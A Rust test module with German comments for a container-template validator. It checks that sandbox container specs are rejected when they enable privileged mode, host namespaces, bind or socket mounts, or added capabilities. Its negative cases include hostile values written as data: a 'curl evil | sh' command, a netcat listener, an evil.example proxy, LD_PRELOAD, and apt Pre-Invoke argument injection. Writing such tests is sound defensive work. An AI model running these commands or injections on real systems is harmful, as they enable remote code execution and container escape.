//! Tests der festen Vorlage (Port von `tests/test_runner_agent.py`, Abschnitt Vorlage).

use super::*;

/// Standardadresse des Port-Exports in den Tests (Heimnetz).
const BIND: &str = "0.0.0.0";

#[allow(clippy::too_many_arguments)]
fn work_body(
    session: &str,
    workspace: &str,
    image: &str,
    limits: &Limits,
    network: &str,
    preview_port: Option<u64>,
    spec: &Value,
    scratch: Option<&Scratch>,
    proxy_url: Option<&str>,
) -> Value {
    super::work_body(
        session,
        workspace,
        image,
        limits,
        network,
        preview_port,
        spec,
        scratch,
        proxy_url,
        BIND,
    )
}

fn check_inspect(
    info: &Value,
    expected: &Limits,
    preview_port: Option<u64>,
    scratch_source: Option<&str>,
) -> Vec<String> {
    super::check_inspect(info, expected, preview_port, scratch_source, BIND)
}

const IMAGE: &str = "ghcr.io/beerlesklopfer/multigpt-runner-work:1@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const OTHER_IMAGE: &str = "docker.io/library/alpine@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
const SCRATCH_UUID: &str = "0b5f2c1e-7d4a-4c1b-9a8e-3f2d1c0b9a87";

fn bounds() -> Bounds {
    Bounds {
        images: BTreeSet::from([IMAGE.to_string()]),
        ..Bounds::default()
    }
}

fn limits() -> Limits {
    Limits {
        cpus: 1.5,
        memory_mb: 512,
        pids: 256,
        tmpfs_mb: 128,
        network: "none".into(),
        rootfs_mb: None,
    }
}

fn work() -> Value {
    let l = limits();
    work_body(
        "42",
        "7",
        IMAGE,
        &l,
        &network_name("42", "net"),
        Some(10080),
        &json!({"limits": l.as_value()}),
        None,
        None,
    )
}

#[test]
fn work_body_matches_template() {
    let cfg = bounds();
    let body = work();
    assert_eq!(check_body(&body, &cfg), Ok(Role::Work));
    assert_eq!(body["cap_drop"], json!(["ALL"]));
    assert_eq!(body["read_only_filesystem"], json!(true));
    assert_eq!(body["privileged"], json!(false));
    assert_eq!(body["user"], json!("1000:1000"));
    assert_eq!(
        body["resource_limits"]["memory"],
        json!({"limit": 512u64 << 20, "swap": 512u64 << 20})
    );
    assert_eq!(body["resource_limits"]["cpu"]["quota"], json!(150000));
    // Standardexport (Nutzer 2026-10-14): 8080 → 10080, 8443 → 10443, im Heimnetz.
    assert_eq!(
        body["portmappings"],
        json!([
            {"host_ip": "0.0.0.0", "host_port": 10080, "container_port": 8080, "protocol": "tcp"},
            {"host_ip": "0.0.0.0", "host_port": 10443, "container_port": 8443, "protocol": "tcp"},
        ])
    );
    let dests: Vec<&str> = body["mounts"]
        .as_array()
        .unwrap()
        .iter()
        .map(|m| m["destination"].as_str().unwrap())
        .collect();
    assert_eq!(dests, ["/workspace", "/tmp"]);
    assert!(body["env"]["HOME"].as_str().unwrap().starts_with("/tmp"));
    assert_eq!(
        check_body(&relay_body("42", IMAGE, &[("10.0.0.5".into(), 22)]), &cfg),
        Ok(Role::Relay)
    );
}

#[test]
fn names_match_python() {
    // Werte aus runner_agent/template.py (hashlib.sha256(...).hexdigest()[:16]).
    assert_eq!(short_id("42"), "73475cb40a568e8d");
    assert_eq!(work_name("42"), "mgpt-ses-73475cb40a568e8d");
    assert_eq!(network_name("42", "rel"), "mgpt-rel-73475cb40a568e8d");
    assert!(NAME_RE.is_match(&container_name("42", "tool", Some("c1"))));
    assert_ne!(
        container_name("42", "tool", Some("c1")),
        container_name("42", "tool", Some("c2"))
    );
}

#[test]
fn spec_label_is_sorted_compact_ascii() {
    let spec = json!({"z": 1, "a": {"y": [1, 2], "b": "ä"}, "cpus": 2.0});
    assert_eq!(
        spec_label(&spec),
        "{\"a\":{\"b\":\"\\u00e4\",\"y\":[1,2]},\"cpus\":2.0,\"z\":1}"
    );
}

type Mutation = (&'static str, fn(&mut Value));

fn mutations() -> Vec<Mutation> {
    vec![
        ("volumes", |b| {
            b["volumes"] = json!([{"Name": "x", "Dest": "/workspace"}])
        }),
        ("devices", |b| b["devices"] = json!([{"path": "/dev/kvm"}])),
        ("privileged", |b| b["privileged"] = json!(true)),
        ("cap_add", |b| b["cap_add"] = json!(["SYS_ADMIN"])),
        ("cap_drop", |b| b["cap_drop"] = json!(["NET_RAW"])),
        ("no_new_privileges", |b| {
            b["no_new_privileges"] = json!(false)
        }),
        ("rw_root", |b| b["read_only_filesystem"] = json!(false)),
        ("root_user", |b| b["user"] = json!("0:0")),
        ("pidns_host", |b| b["pidns"] = json!({"nsmode": "host"})),
        ("netns_host", |b| b["netns"] = json!({"nsmode": "host"})),
        ("ipcns_host", |b| b["ipcns"] = json!({"nsmode": "host"})),
        ("userns_host", |b| b["userns"] = json!({"nsmode": "host"})),
        ("foreign_network", |b| b["Networks"] = json!({"podman": {}})),
        ("env_host", |b| b["env_host"] = json!(true)),
        ("env_secret", |b| {
            b["env"]["SSH_AUTH_SOCK"] = json!("/run/user/1000/ssh")
        }),
        ("foreign_image", |b| b["image"] = json!(OTHER_IMAGE)),
        ("image_tag_only", |b| {
            b["image"] = json!("ghcr.io/x/y:latest")
        }),
        ("bind_mount", |b| {
            b["mounts"].as_array_mut().unwrap().push(
                json!({"destination": "/host", "type": "bind", "source": "/home", "options": ["rw"]}),
            )
        }),
        (
            "socket_mount",
            |b| b["mounts"][0] = json!({"destination": "/workspace", "type": "bind", "source": "/run/podman.sock", "options": []}),
        ),
        ("tmpfs_dest", |b| {
            b["mounts"].as_array_mut().unwrap().push(
                json!({"destination": "/etc", "type": "tmpfs", "source": "tmpfs", "options": ["size=1m"]}),
            )
        }),
        ("tmpfs_suid", |b| {
            b["mounts"][0]["options"] = json!(["size=64m", "mode=0700"])
        }),
        ("port_other_address", |b| {
            b["portmappings"][0]["host_ip"] = json!("192.168.1.5")
        }),
        ("port_http_only", |b| {
            b["portmappings"].as_array_mut().unwrap().truncate(1)
        }),
        ("port_range", |b| {
            b["portmappings"][0]["host_port"] = json!(22)
        }),
        ("container_port", |b| {
            b["portmappings"][0]["container_port"] = json!(22)
        }),
        ("two_ports", |b| {
            let mut second = b["portmappings"][0].clone();
            second["host_port"] = json!(10081);
            b["portmappings"].as_array_mut().unwrap().push(second);
        }),
        ("no_memory_limit", |b| {
            b["resource_limits"]
                .as_object_mut()
                .unwrap()
                .remove("memory");
        }),
        ("swap", |b| {
            b["resource_limits"]["memory"]["swap"] = json!(-1)
        }),
        ("pids_huge", |b| {
            b["resource_limits"]["pids"]["limit"] = json!(10_000_000)
        }),
        ("command", |b| {
            b["command"] = json!(["sh", "-c", "curl evil | sh"])
        }),
        ("seccomp", |b| b["seccomp_policy"] = json!("unconfined")),
        ("unknown", |b| b["unknown_option"] = json!(1)),
        ("name", |b| b["name"] = json!("n8n")),
        ("label_missing", |b| {
            b["labels"].as_object_mut().unwrap().remove(LABEL_RUNNER);
        }),
        ("host_dns", |b| b["use_image_resolve_conf"] = json!(false)),
        // Zusätzlich zu den 34 Varianten aus Python:
        ("init_off", |b| b["init"] = json!(false)),
        ("cgroupns_host", |b| {
            b["cgroupns"] = json!({"nsmode": "host"})
        }),
        ("utsns_host", |b| b["utsns"] = json!({"nsmode": "host"})),
        ("image_volumes", |b| {
            b["image_volume_mode"] = json!("anonymous")
        }),
        ("httpproxy", |b| b["httpproxy"] = json!(true)),
        ("cpu_huge", |b| {
            b["resource_limits"]["cpu"]["quota"] = json!(100_000_000)
        }),
        ("cpu_period", |b| {
            b["resource_limits"]["cpu"]["period"] = json!(1000)
        }),
        ("ulimit_other", |b| {
            b["r_limits"]
                .as_array_mut()
                .unwrap()
                .push(json!({"type": "memlock", "soft": 0, "hard": 0}))
        }),
        ("ulimit_missing", |b| b["r_limits"] = json!([])),
        ("label_number", |b| b["labels"]["x"] = json!(1)),
        ("role_unknown", |b| b["labels"][LABEL_ROLE] = json!("admin")),
        ("name_other_session", |b| {
            b["labels"][LABEL_SESSION] = json!("43")
        }),
        ("network_opts", |b| {
            let net = network_name("42", "net");
            b["Networks"][&net] = json!({"aliases": ["x"]});
        }),
        ("two_networks", |b| {
            b["Networks"][network_name("42", "out")] = json!({});
        }),
        ("relay_network", |b| {
            b["Networks"] = json!({ network_name("42", "rel"): {} });
        }),
        ("tmpfs_exec_option", |b| {
            b["mounts"][0]["options"] = json!(["size=64m", "nosuid", "nodev", "exec"])
        }),
        ("tmpfs_no_size", |b| {
            b["mounts"][0]["options"] = json!(["nosuid", "nodev"])
        }),
        ("mount_dup", |b| {
            let first = b["mounts"][0].clone();
            b["mounts"].as_array_mut().unwrap().push(first);
        }),
        ("mount_extra_field", |b| {
            b["mounts"][0]["propagation"] = json!("shared")
        }),
        ("no_mounts", |b| b["mounts"] = json!([])),
        ("not_object", |b| *b = json!([])),
    ]
}

#[test]
fn template_rejects_forbidden_options() {
    let cfg = bounds();
    let all = mutations();
    assert!(all.len() >= 34);
    for (name, mutate) in all {
        let mut body = work();
        mutate(&mut body);
        assert!(
            check_body(&body, &cfg).is_err(),
            "Variante {name} wurde nicht abgelehnt"
        );
    }
}

#[test]
fn relay_command_and_networks_are_fixed() {
    let cfg = bounds();
    let body = relay_body("42", IMAGE, &[("10.0.0.5".into(), 22)]);
    let mut bad = body.clone();
    bad["command"] = json!(["sh", "-c", "nc -l 1"]);
    assert!(check_body(&bad, &cfg).is_err());
    let mut bad = body.clone();
    bad["Networks"]["podman"] = json!({});
    assert!(check_body(&bad, &cfg).is_err());
    let mut bad = body.clone();
    bad["portmappings"] = port_mappings(10080, BIND); // Relay veröffentlicht nichts
    assert!(check_body(&bad, &cfg).is_err());
    let mut bad = body.clone();
    bad["command"]
        .as_array_mut()
        .unwrap()
        .push(json!("evil host:1"));
    assert!(check_body(&bad, &cfg).is_err());
    let targets: Vec<(String, u64)> = (0..51).map(|i| (format!("h{i}"), 22)).collect();
    assert!(check_body(&relay_body("42", IMAGE, &targets), &cfg).is_err());
    let targets: Vec<(String, u64)> = (0..50).map(|i| (format!("h{i}"), 22)).collect();
    assert!(check_body(&relay_body("42", IMAGE, &targets), &cfg).is_ok());
    assert!(check_body(&relay_body("42", IMAGE, &[]), &cfg).is_err());
}

#[test]
fn server_values_are_checked_against_local_limits() {
    let cfg = Bounds {
        max_cpus: 2.0,
        max_memory_mb: 1024,
        ..bounds()
    };
    let with = |f: fn(&mut Limits)| {
        let mut l = limits();
        f(&mut l);
        l
    };
    assert!(
        check_limits(
            &with(|l| {
                l.cpus = 2.0;
                l.memory_mb = 1024
            }),
            &cfg
        )
        .is_ok()
    );
    assert!(check_limits(&with(|l| l.cpus = 4.0), &cfg).is_err());
    assert!(check_limits(&with(|l| l.memory_mb = 4096), &cfg).is_err());
    assert!(check_limits(&with(|l| l.cpus = 0.05), &cfg).is_err());
    assert!(check_limits(&with(|l| l.pids = 8), &cfg).is_err());
    assert!(check_limits(&with(|l| l.tmpfs_mb = 9000), &cfg).is_err());
    assert!(check_limits(&with(|l| l.network = "host".into()), &cfg).is_err());
    let other = [OTHER_IMAGE.to_string()];
    assert!(check_image(Some(OTHER_IMAGE), Some(&other), &cfg.images).is_err());
    assert!(check_image(Some(IMAGE), Some(&other), &cfg.images).is_err());
    assert!(check_image(Some(IMAGE), Some(&[IMAGE.to_string()]), &cfg.images).is_ok());
    assert!(check_image(None, None, &cfg.images).is_err());
}

#[test]
fn network_body_must_be_internal_without_dns() {
    let name = network_name("42", "net");
    let none = BTreeMap::new();
    assert!(check_network_body(&network_body(&name, true, &none)).is_ok());
    assert!(check_network_body(&network_body(&name, false, &none)).is_err());
    let mut body = network_body(&name, true, &none);
    body["dns_enabled"] = json!(true);
    assert!(check_network_body(&body).is_err());
    assert!(check_network_body(&network_body("podman", true, &none)).is_err());
    let mut body = network_body(&name, true, &none);
    body["options"] = json!({"isolate": "false"});
    assert!(check_network_body(&body).is_err());
    let mut body = network_body(&name, true, &none);
    body["driver"] = json!("macvlan");
    assert!(check_network_body(&body).is_err());
    // „default“ darf ein Gateway haben, das Ausgangsnetz der Positivliste auch.
    let default = BTreeMap::from([(LABEL_NETWORK.to_string(), "default".to_string())]);
    assert!(check_network_body(&network_body(&name, false, &default)).is_ok());
    assert!(check_network_body(&network_body(&network_name("42", "out"), false, &none)).is_ok());
}

fn inspect(host: Value) -> Value {
    let mut base = json!({
        "CpuQuota": 150000,
        "CpuPeriod": 100000,
        "Memory": 512u64 << 20,
        "MemorySwap": 512u64 << 20,
        "PidsLimit": 256,
        "Tmpfs": {
            "/workspace": "size=128m,mode=0700,nosuid,nodev,rw",
            "/tmp": "size=256m,mode=1777,nosuid,nodev,rw",
        },
        "ReadonlyRootfs": true,
        "Privileged": false,
        "CapAdd": [],
        "SecurityOpt": ["no-new-privileges"],
        "NetworkMode": "bridge",
        "PidMode": "private",
        "PortBindings": {
            "8080/tcp": [{"HostIp": "0.0.0.0", "HostPort": "10080"}],
            "8443/tcp": [{"HostIp": "0.0.0.0", "HostPort": "10443"}],
        },
        "Binds": [],
    });
    for (k, v) in host.as_object().unwrap() {
        base[k] = v.clone();
    }
    json!({"HostConfig": base, "Config": {"User": "1000:1000"}, "Mounts": []})
}

#[test]
fn inspect_comparison_reports_deviations() {
    let expected = limits();
    let p = Some(10080);
    assert!(check_inspect(&inspect(json!({})), &expected, p, None).is_empty());
    assert_eq!(actual_limits(&inspect(json!({})), "none"), expected);
    assert!(
        !check_inspect(
            &inspect(json!({"Memory": 1u64 << 30, "MemorySwap": 1u64 << 30})),
            &expected,
            p,
            None
        )
        .is_empty()
    );
    for bad in [
        json!({"Privileged": true}),
        json!({"PidMode": "host"}),
        json!({"Binds": ["/home:/x"]}),
        json!({"PortBindings": {"8080/tcp": [{"HostIp": "0.0.0.0", "HostPort": "10080"}]}}),
        json!({"PortBindings": {
            "8080/tcp": [{"HostIp": "127.0.0.1", "HostPort": "10080"}],
            "8443/tcp": [{"HostIp": "127.0.0.1", "HostPort": "10443"}],
        }}),
        json!({"PortBindings": {"22/tcp": [{"HostIp": "0.0.0.0", "HostPort": "10080"}]}}),
        json!({"MemorySwap": -1}),
        json!({"PidsLimit": 0}),
        json!({"ReadonlyRootfs": false}),
        json!({"CapAdd": ["NET_ADMIN"]}),
        json!({"SecurityOpt": []}),
        json!({"Devices": [{"PathOnHost": "/dev/kvm"}]}),
        json!({"Tmpfs": {"/workspace": "size=128m", "/etc": "size=1m"}}),
        json!({"Tmpfs": {"/workspace": "size=1g"}}),
        json!({"CpuQuota": 800000}),
        json!({"IpcMode": "host"}),
    ] {
        assert!(
            !check_inspect(&inspect(bad.clone()), &expected, p, None).is_empty(),
            "{bad}"
        );
    }
    let mut info = inspect(json!({}));
    info["Config"]["User"] = json!("0:0");
    assert!(!check_inspect(&info, &expected, p, None).is_empty());
    let mut info = inspect(json!({}));
    info["Mounts"] =
        json!([{"Type": "bind", "Source": "/home", "Destination": "/x", "Options": []}]);
    assert!(!check_inspect(&info, &expected, p, None).is_empty());
    // Ohne Vorschau-Port darf kein Port gebunden sein.
    assert!(!check_inspect(&inspect(json!({})), &expected, None, None).is_empty());
    // NanoCpus statt Quota/Period
    let info = inspect(json!({"CpuQuota": 0, "CpuPeriod": 0, "NanoCpus": 1_500_000_000u64}));
    assert!(check_inspect(&info, &expected, p, None).is_empty());
}

#[test]
fn inspect_accepts_only_the_scratch_bind() {
    let expected = limits();
    let src = format!("/home/u/MultiGPT/Scratch/{SCRATCH_UUID}");
    let mut info =
        inspect(json!({"Binds": [format!("{src}:/scratch:rw,noexec,nosuid,nodev,rbind")]}));
    info["Mounts"] = json!([{"Type": "bind", "Source": src, "Destination": "/scratch",
                             "Options": ["rbind", "noexec", "nosuid", "nodev"]}]);
    assert!(check_inspect(&info, &expected, Some(10080), Some(&src)).is_empty());
    assert!(!check_inspect(&info, &expected, Some(10080), None).is_empty());
    info["Mounts"][0]["Options"] = json!(["rbind"]);
    assert!(!check_inspect(&info, &expected, Some(10080), Some(&src)).is_empty());
}

fn local_body(cfg: &Bounds) -> Value {
    let scratch = Scratch {
        mode: "local".into(),
        size_mb: 1024,
        source: Some(format!(
            "{}/{SCRATCH_UUID}",
            cfg.scratch_host_dir.as_deref().unwrap_or("")
        )),
    };
    work_body(
        "42",
        "7",
        IMAGE,
        &limits(),
        &network_name("42", "net"),
        None,
        &json!({}),
        Some(&scratch),
        None,
    )
}

#[test]
fn local_scratch_bind_is_strictly_limited() {
    let cfg = Bounds {
        scratch_host_dir: Some("/home/user/MultiGPT/Scratch".into()),
        ..bounds()
    };
    let muts: Vec<fn(&mut Value)> = vec![
        |b| b["mounts"][2]["source"] = json!("/home/user"),
        |b| b["mounts"][2]["source"] = json!("/home/user/MultiGPT/Scratch/../.ssh"),
        |b| b["mounts"][2]["options"] = json!(["rbind", "rw"]),
        |b| b["mounts"][2]["destination"] = json!("/workspace"),
        |b| {
            b.as_object_mut().unwrap().remove("userns");
        },
        |b| b["userns"] = json!({"nsmode": "host"}),
        |b| {
            b["mounts"][2]["source"] =
                json!(format!("/home/user/MultiGPT/Scratch/{SCRATCH_UUID}/x"))
        },
    ];
    for mutate in muts {
        let mut body = local_body(&cfg);
        assert_eq!(check_body(&body, &cfg), Ok(Role::Work));
        mutate(&mut body);
        assert!(check_body(&body, &cfg).is_err());
    }
    // Ohne eingerichteten Ordner gibt es gar keinen Bind-Mount.
    assert!(check_body(&local_body(&cfg), &bounds()).is_err());
}

#[test]
fn container_scratch_is_noexec_tmpfs() {
    let scratch = Scratch {
        mode: "container".into(),
        size_mb: 64,
        source: None,
    };
    let mount = scratch.mount();
    assert_eq!(mount["type"], "tmpfs");
    assert!(
        mount["options"]
            .as_array()
            .unwrap()
            .contains(&json!("noexec"))
    );
    let l = limits();
    let body = work_body(
        "42",
        "7",
        IMAGE,
        &l,
        &network_name("42", "net"),
        None,
        &json!({}),
        Some(&scratch),
        None,
    );
    assert_eq!(check_body(&body, &bounds()), Ok(Role::Work));
    assert!(body.get("userns").is_none());
}

#[test]
fn userns_only_with_local_scratch() {
    let mut body = work();
    body["userns"] = keep_id();
    assert!(check_body(&body, &bounds()).is_err());
}

#[test]
fn helper_container_only_on_relay_network() {
    let cfg = bounds();
    let body = tool_body("42", "c1", IMAGE);
    assert_eq!(check_body(&body, &cfg), Ok(Role::Tool));
    assert_eq!(
        body["Networks"]
            .as_object()
            .unwrap()
            .keys()
            .collect::<Vec<_>>(),
        [&network_name("42", "rel")]
    );
    let muts: Vec<fn(&mut Value)> = vec![
        |b| b["Networks"][network_name("42", "net")] = json!({}),
        |b| {
            b["mounts"]
                .as_array_mut()
                .unwrap()
                .push(tmpfs("/workspace", 16, "0700", true))
        },
        |b| b["command"] = json!(["ssh", "x"]),
        |b| b["name"] = json!(container_name("42", "tool", Some("other"))),
        |b| b["portmappings"] = port_mappings(10080, BIND),
    ];
    for mutate in muts {
        let mut bad = body.clone();
        mutate(&mut bad);
        assert!(check_body(&bad, &cfg).is_err());
    }
    let rel = network_body(&network_name("42", "rel"), false, &BTreeMap::new());
    assert!(check_network_body(&rel).is_err());
}

#[test]
fn default_network_may_use_host_dns() {
    let mut l = limits();
    l.network = "default".into();
    let body = work_body(
        "42",
        "7",
        IMAGE,
        &l,
        &network_name("42", "net"),
        Some(10080),
        &json!({}),
        None,
        None,
    );
    assert_eq!(body["use_image_resolve_conf"], json!(false));
    assert_eq!(check_body(&body, &bounds()), Ok(Role::Work));
}

// --- Paketquellen ------------------------------------------------------------------------

type BoxedMutation = Box<dyn Fn(&mut Value)>;

#[test]
fn root_argv_only_fixed_apt_commands() {
    let pkgs = |names: &[&str]| names.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    assert!(check_root_argv(&apt_update_argv()).is_ok());
    assert!(check_root_argv(&strip_setuid_argv()).is_ok());
    let install = apt_install_argv(&pkgs(&["jq", "g++", "libssl3t64"])).unwrap();
    assert!(check_root_argv(&install).is_ok());
    assert_eq!(
        &install[install.len() - 4..],
        ["--", "jq", "g++", "libssl3t64"]
    );
    for bad in [
        pkgs(&["bash", "-c", "id"]),
        pkgs(&["apt-get", "update", "-o", "APT::Update::Pre-Invoke::=id"]),
        pkgs(&["apt-get", "-q", "update", "x"]),
        pkgs(&["apt-get", "-q", "-y", "install", "jq"]),
        pkgs(&["find", "/", "-exec", "sh", "{}", "+"]),
        vec![],
    ] {
        assert!(check_root_argv(&bad).is_err(), "{bad:?}");
    }
    let mut tail = apt_install_argv(&pkgs(&["jq"])).unwrap();
    tail.push("-oDpkg::Pre-Invoke::=id".into());
    assert!(check_root_argv(&tail).is_err());
    let mut no_sep = apt_install_argv(&pkgs(&["jq"])).unwrap();
    no_sep.retain(|a| a != "--");
    assert!(check_root_argv(&no_sep).is_err());
    assert!(check_root_argv(&with_timeout(&apt_update_argv(), 180)).is_ok());
    assert_eq!(with_timeout(&apt_update_argv(), 5000)[3], "900");
    for prefix in [
        ["timeout", "-k", "5", "0"],
        ["timeout", "-k", "5", "901"],
        ["timeout", "-s", "9", "10"],
    ] {
        let mut argv = pkgs(&prefix);
        argv.extend(apt_update_argv());
        assert!(check_root_argv(&argv).is_err(), "{argv:?}");
    }
    let mut nested = with_timeout(&with_timeout(&apt_update_argv(), 10), 10);
    assert!(check_root_argv(&nested).is_err());
    nested.truncate(4);
    assert!(check_root_argv(&nested).is_err());
    assert!(apt_install_argv(&[]).is_err());
    assert!(apt_install_argv(&pkgs(&["-y"])).is_err());
    assert!(apt_install_argv(&pkgs(&["Jq"])).is_err());
}

#[test]
fn proxy_url_and_package_hosts() {
    assert_eq!(
        proxy_url("10.89.0.2").as_deref(),
        Some("http://10.89.0.2:3128")
    );
    for bad in [
        "",
        "relay",
        "10.89.0",
        "300.1.1.1",
        "fd00::1",
        "10.0.0.1:80",
    ] {
        assert!(proxy_url(bad).is_none(), "{bad}");
    }
    for ok in ["deb.debian.org", "files.pythonhosted.org", "a.bc"] {
        assert!(is_package_host(ok), "{ok}");
    }
    let long = format!("{}.org", vec!["a".repeat(63); 4].join("."));
    for bad in [
        "localhost",
        "1.2.3.4",
        "pypi.org:443",
        "PyPI.org",
        "*.debian.org",
        "deb.debian.org.",
        "-a.org",
        long.as_str(),
    ] {
        assert!(!is_package_host(bad), "{bad}");
    }
}

#[test]
fn packages_work_body_passes_and_mutations_fail() {
    let cfg = bounds();
    let mut l = limits();
    l.network = "packages".into();
    l.rootfs_mb = Some(2048);
    let url = proxy_url("10.89.0.2").unwrap();
    let body = work_body(
        "42",
        "7",
        IMAGE,
        &l,
        &network_name("42", "net"),
        Some(10080),
        &json!({}),
        None,
        Some(&url),
    );
    assert_eq!(check_body(&body, &cfg), Ok(Role::Work));
    // fsize mindestens die Grenze der Schicht (große .deb-Dateien).
    assert_eq!(body["r_limits"][1]["hard"], json!(2048u64 << 20));
    let mutations: Vec<BoxedMutation> = vec![
        Box::new(|b| b["read_only_filesystem"] = json!(true)),
        Box::new(|b| b["cap_add"] = json!(["CHOWN"])),
        Box::new(|b| {
            b["cap_add"]
                .as_array_mut()
                .unwrap()
                .push(json!("NET_ADMIN"))
        }),
        Box::new(|b| {
            b.as_object_mut().unwrap().remove("cap_add");
        }),
        Box::new(|b| b["no_new_privileges"] = json!(false)),
        Box::new(|b| b["env"]["HTTP_PROXY"] = json!("http://evil.example:3128")),
        Box::new(|b| b["env"]["https_proxy"] = json!("http://10.89.0.3:3128")),
        Box::new(|b| b["env"]["LD_PRELOAD"] = json!("/tmp/x.so")),
        Box::new(|b| b["env"] = env()),
        Box::new(|b| b["labels"][LABEL_NETWORK] = json!("none")),
        Box::new(|b| b["Networks"] = json!({ network_name("43", "net"): {} })),
        Box::new(|b| b["use_image_resolve_conf"] = json!(false)),
    ];
    for (i, mutate) in mutations.iter().enumerate() {
        let mut bad = body.clone();
        mutate(&mut bad);
        assert!(check_body(&bad, &cfg).is_err(), "Mutation {i} angenommen");
    }
    // Ohne packages bleibt die strenge Vorlage: cap_add verboten.
    let mut plain = work();
    plain["cap_add"] = json!([]);
    assert!(check_body(&plain, &cfg).is_err());
}

#[test]
fn proxy_body_passes_and_mutations_fail() {
    let cfg = bounds();
    let hosts = vec!["deb.debian.org".to_string(), "pypi.org".to_string()];
    let body = proxy_body("42", IMAGE, &hosts);
    assert_eq!(check_body(&body, &cfg), Ok(Role::Relay));
    let mutations: Vec<BoxedMutation> = vec![
        Box::new(|b| b["command"][3] = json!("10.0.0.1")),
        Box::new(|b| b["command"][3] = json!("pypi.org:22")),
        Box::new(|b| b["command"][2] = json!("8080")),
        Box::new(|b| b["command"] = json!(["mgpt-relay", "--proxy", "3128"])),
        Box::new(|b| {
            b["Networks"] = json!({ network_name("42", "rel"): {}, network_name("42", "out"): {} })
        }),
        Box::new(|b| b["Networks"] = json!({ network_name("42", "net"): {} })),
        Box::new(|b| b["read_only_filesystem"] = json!(false)),
        Box::new(|b| b["cap_add"] = json!(CAPS_PACKAGES)),
    ];
    for (i, mutate) in mutations.iter().enumerate() {
        let mut bad = body.clone();
        mutate(&mut bad);
        assert!(check_body(&bad, &cfg).is_err(), "Mutation {i} angenommen");
    }
}

#[test]
fn inspect_in_packages_mode_allows_only_relaxed_values() {
    let mut l = limits();
    l.network = "packages".into();
    let url = proxy_url("10.89.0.2").unwrap();
    let body = work_body(
        "42",
        "7",
        IMAGE,
        &l,
        &network_name("42", "net"),
        None,
        &json!({}),
        None,
        Some(&url),
    );
    let info = |caps: Value, ro: bool| {
        json!({
            "HostConfig": {
                "CpuQuota": body["resource_limits"]["cpu"]["quota"],
                "CpuPeriod": CPU_PERIOD,
                "Memory": 512u64 << 20,
                "MemorySwap": 512u64 << 20,
                "PidsLimit": 256,
                "Tmpfs": {"/workspace": "size=128m,mode=0700,nosuid,nodev"},
                "ReadonlyRootfs": ro,
                "CapAdd": caps,
                "SecurityOpt": ["no-new-privileges"],
            },
            "Config": {"User": USER},
        })
    };
    let ok = info(json!(["CAP_CHOWN", "CAP_SETUID", "setgid"]), false);
    assert_eq!(check_inspect(&ok, &l, None, None), Vec::<String>::new());
    let bad = info(json!(["CAP_SYS_ADMIN"]), false);
    assert!(!check_inspect(&bad, &l, None, None).is_empty());
    // Dieselben Werte ohne packages: beschreibbar und Capabilities sind Abweichungen.
    l.network = "none".into();
    assert_eq!(check_inspect(&ok, &l, None, None).len(), 2);
}
